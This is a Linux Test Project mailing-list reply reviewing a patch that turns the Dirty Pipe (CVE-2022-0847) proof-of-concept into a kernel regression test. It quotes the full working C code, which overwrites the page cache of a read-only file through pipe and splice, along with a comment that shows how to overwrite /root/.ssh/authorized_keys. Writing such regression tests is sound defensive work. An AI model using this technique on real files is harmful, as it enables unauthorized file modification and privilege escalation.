Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id E29FDC43334
	for <ltp@archiver.kernel.org>; Tue, 12 Jul 2022 01:44:31 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 53BDB3CA539
	for <ltp@archiver.kernel.org>; Tue, 12 Jul 2022 03:44:29 +0200 (CEST)
Received: from in-6.smtp.seeweb.it (in-6.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::6])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (P-384))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 252903CA539
 for <ltp@lists.linux.it>; Tue, 12 Jul 2022 03:44:17 +0200 (CEST)
Received: from esa7.fujitsucc.c3s2.iphmx.com (esa7.fujitsucc.c3s2.iphmx.com
 [68.232.159.87])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by in-6.smtp.seeweb.it (Postfix) with ESMTPS id 45797140054C
 for <ltp@lists.linux.it>; Tue, 12 Jul 2022 03:44:15 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;
 d=fujitsu.com; i=@fujitsu.com; q=dns/txt; s=fj1;
 t=1657590256; x=1689126256;
 h=from:to:cc:subject:date:message-id:references:
 in-reply-to:content-id:content-transfer-encoding: mime-version;
 bh=NzDxArQf03NMfRBpAyPFFqCX4z3lMSdtIyougl8wrlk=;
 b=m8SYoOnUnGe5r18PmxqEtn5gP39RS2CeScchjUBF0eOjU9lJ3VQVQ+4b
 Dv6/GlmepcqDyEX4aZ/mYtoDqajAAQ6/df6CIj33bVG8pIZ92HzacaEJ2
 +Jdpz6WzNIYib7PnFftxvtjHxjZuF4SltKDDyYQjo2VWj7xOBZ6cl4SuW
 0IpDbVqzsjRhsb9Yu5dkvnd/BDR2YETFbTpb2uFVYYD/VIyvfgPUEq/Ww
 HotdEa65uIkDA1y76vG8SH+cG4Z9S5q7S3Z4a7Uq2iIvaW+srBxhK2PHB
 esnzHthD6PQ2n9eJJwGgqNMhosznLA6knc3oNDFdKiVE9tu3XVwtx5njF A==;
X-IronPort-AV: E=McAfee;i="6400,9594,10405"; a="60197449"
X-IronPort-AV: E=Sophos;i="5.92,264,1650898800"; d="scan'208";a="60197449"
Received: from mail-os0jpn01lp2110.outbound.protection.outlook.com (HELO
 JPN01-OS0-obe.outbound.protection.outlook.com) ([104.47.23.110])
 by ob1.fujitsucc.c3s2.iphmx.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
 12 Jul 2022 10:44:14 +0900
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=Pk1I8XsCTWmholc5L7EvCXoxAFmCDseCEJN8bYn7rVfbGHb8VmYYGW7agEjiSPyAlfkT6RPwJ7y8ydQnGVb5h4gr/bheMYzy1kXucZoeBQHD2RVWbw5KdI+aUWWgaJVevuIixXes5dcUZgnC40V6jvy/8E82fa4gm8zg0lpCWmqf9cqcEwsO/girM3ZGtjSptzOJD9lVjfeeDxK2UvfW1lM4/o40k5EMc1FcfcqSqSfSBnqpJpwiZMywgPutiiJXWS4BkIDhY2L7gQ9e1LpSFcapleBZW7P1sF/D9NKfVVgsbt0iSYDRg9veTDz0z/2DGJACm8auajOshkrUjxar5Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=NzDxArQf03NMfRBpAyPFFqCX4z3lMSdtIyougl8wrlk=;
 b=NG4YN0qHfZDYna5MkywvXr/DBNHA83mCotZeOL0yHg5EuZwgpqLJQnwuT5evT3fdBmTpo7Or6u+2h9N9ru1a3JZJ/6A3HjKsPc9n3bQu2nJtL1i48Vdrfr+hfw1W/l5O9kR4BI4HF+tUtQ9vVpkGmMMsHsb2rheCT2qSWsipldTUHGJ7i9Pn6srtSmge70YfxkvbGxhvu936k5LB1nR8Ny+aCLm+hTC+Fp9eFEWy6ttJrBMZ/PTG8M6TfsMkX+wykcAHfQTXJaUUYhuQSYmF8mjA03pn7jkjwM5wytcO/+5jVSEU4NYQphLx7zmjw+0+mF4immRwI8IZV223cayDFg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=fujitsu.com; dmarc=pass action=none header.from=fujitsu.com;
 dkim=pass header.d=fujitsu.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=fujitsu.onmicrosoft.com; s=selector2-fujitsu-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=NzDxArQf03NMfRBpAyPFFqCX4z3lMSdtIyougl8wrlk=;
 b=G2+ZKENVH6RbSXPb5HWgWU3PcR4EfUjDrtVVoJXg9AxGjZghbNUfhwhS/PBsD/fZZZ1EPU0BRgj78hfrSblM0ZQWR53iSjp++xJ9FqcZS+YyW/3Tkq+AU+oljyYlEMcQE6s0NFMCxZ+TwuROZSd3LaPKKoviYr0Y5dTJfpVOAsk=
Received: from TY2PR01MB4427.jpnprd01.prod.outlook.com (2603:1096:404:10d::20)
 by TYCPR01MB8568.jpnprd01.prod.outlook.com (2603:1096:400:138::6)
 with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5417.16; Tue, 12 Jul
 2022 01:44:10 +0000
Received: from TY2PR01MB4427.jpnprd01.prod.outlook.com
 ([fe80::fd30:6d2d:85fb:8160]) by TY2PR01MB4427.jpnprd01.prod.outlook.com
 ([fe80::fd30:6d2d:85fb:8160%5]) with mapi id 15.20.5417.026; Tue, 12 Jul 2022
 01:44:10 +0000
From: "xuyang2018.jy@fujitsu.com" <xuyang2018.jy@fujitsu.com>
To: "rpalethorpe@suse.de" <rpalethorpe@suse.de>
Thread-Topic: [LTP] [PATCH] security/dirtypipe: Add test for CVE-2022-0847
Thread-Index: AQHYkeYXJbY+tw4gxkCw3tqqH4zhGa14/acAgAERQAA=
Date: Tue, 12 Jul 2022 01:44:10 +0000
Message-ID: <7085750b-07b1-1fc3-9c63-2f253616555a@fujitsu.com>
References: <1657190667-2220-1-git-send-email-xuyang2018.jy@fujitsu.com>
 <87k08joqp7.fsf@suse.de>
In-Reply-To: <87k08joqp7.fsf@suse.de>
Accept-Language: zh-CN, en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
authentication-results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=fujitsu.com;
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 0b6391f3-f2ec-4e17-7ba0-08da63a80425
x-ms-traffictypediagnostic: TYCPR01MB8568:EE_
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: cpJ/zJbbhOPo4eUAFiKtw+A5jbnshB2BN0BzCP2RiCVK4Lage+h6BIZYXxE3+3tU+AbyPNGQcFo/Pf57wwGjJ4CadCn5nIeFnhOF4C6TshBU3U/pUB8gz28BKzoDmYNMgcLJnVxcJPxFk7hqWJ6EJUbhA90etA1U9eOVsiveeSuEaxCW/Kh7PrRr6+T9YRsyv8utTGzFT7uGAmX8ngoGORJ4lg2VFZ9+BBebRC/mqvxHLeu73NWRzaSvaUzgNk2ZQVWqvT4SNHU1c2aJKYpu49+KwiYWb36mJmA50lzWP4eqZOjznuU/ojVQ6voriHLImCoLr7JEY/kKEvhAa549HcXpVJ/YOqfZUYIhzMUHYwrZTtN5/nJKqg3pm9aVqCxP9DUA5wSeaIE0kfsYTf+WqrNRXQkgYwupSyCuUd6h9tORzsiYLK6DXM9g42gySoaBw7CcR2MmUoIlL618FofmReEEb/wJ4Zb48R5nQzYCLtuuZN4oIv6M7/Wk25o9ZHbhCuW2Yt934uyEI//WMZ/j6iEOCBQHKDDubsxyNEeNJ4+4zidCJzCTZRTrLco2fFcwoxr74an76FuROYi+mV8zi36zx0epB6Jql3joUWee74GaZYW8JLvX7zbF/GC0NDkyVsE/cPDrF6kHxE+uOXkK/bA0O16ZFCsLCpVgTVa5jqwC++ruftPY0VPCknZCw5+29o260PRmDEGbE3/dxGiIpdS++kqR6U7ArqQYl6vvrVJdVye+bkgiRH5/zhbRjzGsE/B9lSfymWN3sErjiqOkSlijp8SpF51iRe04yiXja6AY/BIWpeT01WVuT59iH7IJ+NlRph8zYEuokJ5kWCXGel+GrD0qqUKLi5ujFknn2+5/TUZtPtEXjGuRWGINJ+P3
x-forefront-antispam-report: CIP:255.255.255.255; CTRY:; LANG:en; SCL:1; SRV:;
 IPV:NLI; SFV:NSPM; H:TY2PR01MB4427.jpnprd01.prod.outlook.com; PTR:; CAT:NONE;
 SFS:(13230016)(4636009)(39860400002)(366004)(396003)(346002)(136003)(376002)(478600001)(2616005)(6486002)(966005)(36756003)(316002)(38100700002)(76116006)(8676002)(26005)(41300700001)(66476007)(38070700005)(86362001)(31696002)(6512007)(91956017)(66946007)(2906002)(186003)(82960400001)(8936002)(4326008)(66556008)(15650500001)(85182001)(6916009)(71200400001)(6506007)(64756008)(31686004)(5660300002)(83380400001)(66446008)(122000001)(45980500001);
 DIR:OUT; SFP:1101; 
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: =?utf-8?B?U3ZSRVh3K0VpVGRWOStZazJZbUJsaFRnR0xhaCtXWDZPNU94VFIyY0JyZkNP?=
 =?utf-8?B?SkVWdVBNM0NSMUwwQlRLK2hEazRaREJIc2Vid0kycnlXamR4cnlEUnFZamVF?=
 =?utf-8?B?VEhDeXdIOXpQQVVabWpqb2hQd2s4MjJkR0dsb1F1MGZ1aVdXU2c3WHo1NnRN?=
 =?utf-8?B?eXB2dUordjR6cndBai9EQXd1cHBmM2NZNENMUDY4K2ovZk8xd0pudWhLQ3hm?=
 =?utf-8?B?UGlrZEt1TCs5eWJIWWlBT3lLWlBkUHJDS3AwSDJLR2tqcmxDZ1VweEpSMXdL?=
 =?utf-8?B?RmFSUlVmdWk2c2kvaWQvNEYxcWVCZS9RbmQ0UFA1NUhCUTY1ZVE4cFNQOFZP?=
 =?utf-8?B?ejlkSitVVElJMldURjZXWFl3Z2xIeVJDOHNOa2NzU3BFR2tnZHJPN2JIQVNh?=
 =?utf-8?B?MUV3MlFSUHROZkt5SlRiK0JOTXFZMG9xNmIzb3hpaGZlTEhTSmtlOXNtY25t?=
 =?utf-8?B?MnhvNG5PaWlnc1FGSmNOdTlNY1hqS1dIL3BTZVptMC9sd09JTHp5bEhYNUdl?=
 =?utf-8?B?L1lBbjYyUUVlRFpGQWJpRTFhK2xWelplaWgrS1hYUjVIZllFOHZlNFZ1ZlNl?=
 =?utf-8?B?N2FqWjJycUNacXRZNUc3QjEyUUVqNXJiN2FGMmhDTlJuaTluWlpKVHJKeDFN?=
 =?utf-8?B?NC9VTHJ3VnFPY3ppaVc5c2ZKN2duRjVjMVg5VWRmSzB0MXR6WjFyUXE4YTZG?=
 =?utf-8?B?bmtoazVTcTVIUTV1dkxQMVM4Wjk1RWVUOC9reXM3Z2tRRHR1RUJqd1ZPbTB6?=
 =?utf-8?B?RlZLaFJHZyswVjdBbmxEbjRJblNrbU5BbGV0RVJZakgyMzJrOHkxUlhlN1J0?=
 =?utf-8?B?NFAyQnhPQ2cvRWZOYnNsK1Z0Q0FWdlpuZnF1RGhsNEtNRVQxdFZBTEplaXU0?=
 =?utf-8?B?elB5aGc5a3BVUnRsNjZ4M1VSUlJHNFl5VE9VUmJ0cXg2bnM4WnRpeDhxVzdY?=
 =?utf-8?B?K2tSK1YxdFJYcmpZMXZtWFhVTUpGU1JFc3I1azVHT2JZVTFZemV4cWNWb1Fn?=
 =?utf-8?B?blNzYUk2Zk13Z1IxMGdSU2dTU240OVQwNm5iNlY1dFpVdnhCL3pPRncrZW43?=
 =?utf-8?B?aHllNEJabUtGODh3ZkpUVnhxTCtjRWdQdkpUWElaOFBjYXFOelNnNXNGbi9N?=
 =?utf-8?B?RWRlbUx1Q2ZWVEQ1TlVTbU44aVowT1RGUnZPREl0Zk03THdkc0h5VjNjUmhl?=
 =?utf-8?B?YVJGMVkvamdUakxQblFHQjRLOVlxTWZUdEpySmVGTWppU3FpZGFrY2ZhVE4z?=
 =?utf-8?B?Tmo4QnkyYlYwT1htQzN4Y3MzSWlOU2xqVm1aMlV2Z0REUGV1cVVOMHFzdkhh?=
 =?utf-8?B?UGRObEw5enowVStkRis1bGZoTFB1RHMweGVOMTRxa3QzRHlQWDZBcXJYQ2ND?=
 =?utf-8?B?N3dpeklIT2tYck1VMzRBeE5Idk5vVTRNWkl5ODFDN2ppeWk3V1FPekNWb21s?=
 =?utf-8?B?cWduS05QMHphQU1XT2J3WmFObUNFTFh3N0xTL21zOEFITWdvTEc0eFV1dXJR?=
 =?utf-8?B?N25FSEdoUVRFSUk4OGlvT3JZNlRFVHNIdDV4ZHJxS3VCNTJqQk56RWwycjJ2?=
 =?utf-8?B?V3ZjN0FmL1lYbmFVWEc3cm90UmRhRnJqN3c3UTR5RmhVSlhEYm15cUNQdFIy?=
 =?utf-8?B?OUs0RFQwbEM1ZzdoTGE0Zmkyb3BhZVBFK2VKTTFwb2V0WjlxbDJrejgwL0xT?=
 =?utf-8?B?bWUxWXI2TnFZWjFuSFVGU0RxMU9nNVZEbGRKWmdiSmwxZkY1dkVjaDJmSDZs?=
 =?utf-8?B?K3RDbGg0bnJHTDFSMkFKaERERWt5eVg4ZHV4U21oVWV3ZkkzaGhFNzFrMzF1?=
 =?utf-8?B?a3dRNldSYUZpWFNsdG91QmtTRDUrZjBCTnlJN1FkTm9RL1ZZWmlLTHJONDlz?=
 =?utf-8?B?aDZDOVVFaW9RZEF5M3J2eVJlSHVpVFB0YkRaWTFCeW41U1ZOMktXOWU4SThZ?=
 =?utf-8?B?UXR6QnNjRWZvZG52c2xXZkdJWkNvNmR6aFJ1QlNCMVhCY1VzR2pHamZ2bUxR?=
 =?utf-8?B?NWE2dU5HU21xeWwxWVNId2M1cFMzSEZySGcvckxJYWtQMDFHMEZwTHRjaXFh?=
 =?utf-8?B?b05IdXpqSkY3elBQM3JNVTZJZC9HcnFqY0JOQm9IOGxxTkd0czVscG1iTDd4?=
 =?utf-8?B?VnlETmlvZXRZbjYwOVIrRm5YbWpxdFlUY3hoOUlpbkQzbVlsTmVBY3BFNzZD?=
 =?utf-8?B?c1E9PQ==?=
Content-ID: <20EEBB6FDEAD3E41AA2B03BEBFEC7A84@jpnprd01.prod.outlook.com>
MIME-Version: 1.0
X-OriginatorOrg: fujitsu.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: TY2PR01MB4427.jpnprd01.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 0b6391f3-f2ec-4e17-7ba0-08da63a80425
X-MS-Exchange-CrossTenant-originalarrivaltime: 12 Jul 2022 01:44:10.0942 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: a19f121d-81e1-4858-a9d8-736e267fd4c7
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: uQ1EVMXta2Wi1mAJK46Ao052J6nGbwQFz4Es+q+BxH7sfZGpvqmbuMj8Sip40qVARE5xV7PQDLTlQN1n9ilyOH3U+8OEc8oUEYUsxYhqFLc=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: TYCPR01MB8568
X-Virus-Scanned: clamav-milter 0.102.4 at in-6.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH] security/dirtypipe: Add test for CVE-2022-0847
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Cc: "ltp@lists.linux.it" <ltp@lists.linux.it>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hi Richard
> Hello,
> 
> Yang Xu <xuyang2018.jy@fujitsu.com> writes:
> 
>> Fixes: #921
>> Signed-off-by: Yang Xu <xuyang2018.jy@fujitsu.com>
>> ---
>>   runtest/cve                                   |   1 +
>>   runtest/syscalls                              |   1 +
>>   .../kernel/security/dirtypipe/.gitignore      |   1 +
>>   testcases/kernel/security/dirtypipe/Makefile  |   6 +
>>   .../kernel/security/dirtypipe/dirtypipe.c     | 195 ++++++++++++++++++
>>   5 files changed, 204 insertions(+)
>>   create mode 100644 testcases/kernel/security/dirtypipe/.gitignore
>>   create mode 100644 testcases/kernel/security/dirtypipe/Makefile
>>   create mode 100644 testcases/kernel/security/dirtypipe/dirtypipe.c
>>
>> diff --git a/runtest/cve b/runtest/cve
>> index eaaaa19d7..9ab6dc282 100644
>> --- a/runtest/cve
>> +++ b/runtest/cve
>> @@ -72,5 +72,6 @@ cve-2021-4034 execve06
>>   cve-2021-22555 setsockopt08 -i 100
>>   cve-2021-26708 vsock01
>>   cve-2021-22600 setsockopt09
>> +cve-2022-0847 dirtypipe
>>   # Tests below may cause kernel memory leak
>>   cve-2020-25704 perf_event_open03
>> diff --git a/runtest/syscalls b/runtest/syscalls
>> index a0935821a..efef18136 100644
>> --- a/runtest/syscalls
>> +++ b/runtest/syscalls
>> @@ -1035,6 +1035,7 @@ process_vm_writev02 process_vm_writev02
>>   
>>   prot_hsymlinks prot_hsymlinks
>>   dirtyc0w dirtyc0w
>> +dirtypipe dirtypipe
>>   
>>   pselect01 pselect01
>>   pselect01_64 pselect01_64
>> diff --git a/testcases/kernel/security/dirtypipe/.gitignore b/testcases/kernel/security/dirtypipe/.gitignore
>> new file mode 100644
>> index 000000000..fdf39eed2
>> --- /dev/null
>> +++ b/testcases/kernel/security/dirtypipe/.gitignore
>> @@ -0,0 +1 @@
>> +/dirtypipe
>> diff --git a/testcases/kernel/security/dirtypipe/Makefile b/testcases/kernel/security/dirtypipe/Makefile
>> new file mode 100644
>> index 000000000..5ea7d67db
>> --- /dev/null
>> +++ b/testcases/kernel/security/dirtypipe/Makefile
>> @@ -0,0 +1,6 @@
>> +# SPDX-License-Identifier: GPL-2.0-or-later
>> +
>> +top_srcdir		?= ../../../..
>> +
>> +include $(top_srcdir)/include/mk/testcases.mk
>> +include $(top_srcdir)/include/mk/generic_leaf_target.mk
>> diff --git a/testcases/kernel/security/dirtypipe/dirtypipe.c b/testcases/kernel/security/dirtypipe/dirtypipe.c
>> new file mode 100644
>> index 000000000..dfe7f5985
>> --- /dev/null
>> +++ b/testcases/kernel/security/dirtypipe/dirtypipe.c
>> @@ -0,0 +1,195 @@
>> +// SPDX-License-Identifier: GPL-2.0
>> +/*
>> + * Copyright 2022 CM4all GmbH / IONOS SE
>> + *
>> + * Author: Max Kellermann <max.kellermann@ionos.com>
>> + *
>> + * Ported into ltp by Yang Xu <xuyang2018.jy@fujitsu.com>
>> + */
>> +
>> +/*\
>> + * [Description]
>> + *
>> + * Proof-of-concept exploit for the Dirty Pipe
>> + * vulnerability (CVE-2022-0847) caused by an uninitialized
>> + * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
>> + * file contents in the page cache, even if the file is not permitted
>> + * to be written, immutable or on a read-only mount.
>> + *
>> + * This exploit requires Linux 5.8 or later; the code path was made
>> + * reachable by commit f6dd975583bd ("pipe: merge
>> + * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
>> + * there before, it just provided an easy way to exploit it.
>> + *
>> + * There are two major limitations of this exploit: the offset cannot
>> + * be on a page boundary (it needs to write one byte before the offset
>> + * to add a reference to this page to the pipe), and the write cannot
>> + * cross a page boundary.
>> + *
>> + * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
>> + *
>> + * Further explanation: https://dirtypipe.cm4all.com/
>> + */
> 
> Thanks for doing the conversion, this is an important test IMO. However
> it needs to be simplified. There is code here that mede sense in the
> original PoC, but is just a maintenance risk here. Please see below.
> 
> 
>> +
>> +#ifndef _GNU_SOURCE
>> +#define _GNU_SOURCE
>> +#endif
>> +#include <unistd.h>
>> +#include <fcntl.h>
>> +#include <stdio.h>
>> +#include <stdlib.h>
>> +#include <string.h>
>> +#include <sys/stat.h>
>> +#include <sys/user.h>
>> +#include "tst_test.h"
>> +
>> +#define TEXT "AAAAAAAABBBBBBBB"
>> +#define TESTFILE "testfile"
>> +#define CHUNK 64
>> +#define BUFSIZE 4096
>> +
>> +static int p[2] = {-1, -1}, fd = -1, page_size;
>> +static char *write_buf, *read_buf;
>> +
>> +static void check_file_contents(void)
>> +{
>> +	SAFE_LSEEK(fd, 0, SEEK_SET);
>> +	SAFE_READ(1, fd, read_buf, 4096);
>> +
>> +	if (memcmp(write_buf, read_buf, 4096) != 0)
>> +		tst_res(TFAIL, "read buf data mismatch, bug exists");
>> +	else
>> +		tst_res(TPASS, "read buff data match, bug doesn't exist");
>> +}
>> +
>> +/*
>> + * Create a pipe where all "bufs" on the pipe_inode_info ring have the
>> + * PIPE_BUF_FLAG_CAN_MERGE flag set.
>> + */
>> +static void prepare_pipe(void)
>> +{
>> +	unsigned int pipe_size, total, n, len;
>> +	char buffer[BUFSIZE];
>> +
>> +	SAFE_PIPE(p);
>> +	pipe_size = SAFE_FCNTL(p[1], F_GETPIPE_SZ);
>> +
>> +	/*
>> +	 * fill the pipe completely; each pipe_buffer will now have the
>> +	 * PIPE_BUF_FLAG_CAN_MERGE flag
>> +	 */
>> +	for (total = pipe_size; total > 0;) {
>> +		n = total > sizeof(buffer) ? sizeof(buffer) : total;
>> +		len = SAFE_WRITE(1, p[1], buffer, n);
>> +		total -= len;
>> +	}
>> +
>> +	/*
>> +	 * drain the pipe, freeing all pipe_buffer instances (but leaving the
>> +	 * flags initialized)
>> +	 */
>> +	for (total = pipe_size; total > 0;) {
>> +		n = total > sizeof(buffer) ? sizeof(buffer) : total;
>> +		len = SAFE_READ(1, p[0], buffer, n);
>> +		total -= len;
>> +	}
>> +
>> +	/*
>> +	 * the pipe is now empty, and if somebody adds a new pipe_buffer
>> +	 * without initializing its "flags", the buffe wiill be mergeable
>> +	 */
>> +}
>> +
>> +static void run(void)
>> +{
>> +	off_t offset;
>> +	int data_size, len;
>> +	struct stat st;
>> +	ssize_t nbytes;
>> +	loff_t next_page, end_offset;
>> +
>> +	offset = 1;
>> +	data_size = strlen(TEXT);
>> +	next_page = (offset | (page_size - 1)) + 1;
> 
> I think if the offset is 1 then the next page is just page_size + 1.

Agree.
> 
>> +	end_offset = offset + (loff_t)data_size;
>> +	if (end_offset > next_page)
>> +		tst_brk(TFAIL, "Sorry, cannot write across a page
>> boundary");
>> +
>> +	fd = SAFE_OPEN(TESTFILE, O_RDONLY);
>> +	SAFE_FSTAT(fd, &st);
>> +
>> +	if (offset > st.st_size)
>> +		tst_brk(TFAIL, "Offset is not inside the file");
>> +	if (end_offset > st.st_size)
>> +		tst_brk(TFAIL, "Sorry, cannot enlarget the file");
> 
> This checks the file was written to with enough data already. We can do
> that in setup or not at all. Also the error message should make
> sense. It makes sense in the original reproducer which takes arbtrary
> files and offsets, but not here.

OK.
> 
>> +
>> +	/*
>> +	 * create the pipe with all flags initialized with
>> +	 * PIPE_BUF_FLAG_CAN_MERGE
>> +	 */
> 
> This comment is redundant
Will remove on v2.
> 
>> +	prepare_pipe();
>> +
>> +	/*
>> +	 * splice one byte from before the specified offset into the pipe;
>> +	 * this will add a reference to the page cache, but since
>> +	 * copy_page_to_iter_pipe() does not initialize the "flags",
>> +	 * PIPE_BUF_FLAG_CAN_MERGE is still set
>> +	 */
>> +	--offset;
> 
> So we just use an offset of 0. The above code can probably all be
> removed.

Yes.
> 
>> +	nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
>> +	if (nbytes < 0)
>> +		tst_brk(TFAIL, "splice failed");
>> +	if (nbytes == 0)
>> +		tst_brk(TFAIL, "short splice");
>> +
>> +	/*
>> +	 * the following write will not create a new pipe_buffer, but
>> +	 * will instead write into the page cache, because of the
>> +	 *  PIPE_BUF_FLAG_CAN_MERGE flag
>> +	 */
>> +	len = SAFE_WRITE(1, p[1], TEXT, data_size);
>> +	if (len < nbytes)
>> +		tst_brk(TFAIL, "short write");
>> +
>> +	check_file_contents();
>> +	SAFE_CLOSE(p[0]);
>> +	SAFE_CLOSE(p[1]);
>> +	SAFE_CLOSE(fd);
>> +}
>> +
>> +static void setup(void)
>> +{
>> +	memset(write_buf, 0xff, 4096);
>> +
>> +	page_size = SAFE_SYSCONF(_SC_PAGESIZE);
> 
> I don't think we even need the page size, we can just assume it is >=
> 4Kb which TEXT is not close to in size.

Yes.
> 
>> +
>> +	/*write 4k 0xff to file*/
> 
> Inline comments which are describing non-obvious things about kernel
> internals are fine. However this is just describing what an LTP library
> function does. It's against the style guide.

Sound reasonable.
> 
>> +	tst_fill_file(TESTFILE, 0xff, CHUNK, BUFSIZE / CHUNK);
> 
> write_buf isn't used for writing. I think it would be better to call it
> pattern_buf or just check the first sizeof(TEXT) bytes are not 0xff.
I will think about it.

Thanks for your review.

Best Regards
Yang Xu
> 
>> +}
>> +
>> +static void cleanup(void)
>> +{
>> +	if (p[0] > -1)
>> +		SAFE_CLOSE(p[0]);
>> +	if (p[1] > -1)
>> +		SAFE_CLOSE(p[1]);
>> +	if (fd > -1)
>> +		SAFE_CLOSE(fd);
>> +}
>> +
>> +static struct tst_test test = {
>> +	.setup = setup,
>> +	.cleanup = cleanup,
>> +	.test_all = run,
>> +	.needs_tmpdir = 1,
>> +	.bufs = (struct tst_buffers []) {
>> +		{&write_buf, .size = 4096},
>> +		{&read_buf, .size = 4096},
>> +		{},
>> +	},
>> +	.tags = (const struct tst_tag[]) {
>> +		{"linux-git", "9d2231c5d74e"},
>> +		{"CVE", "CVE-2022-0847"},
>> +		{},
>> +	}
>> +};
>> -- 
>> 2.27.0
> 
> 
> 

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
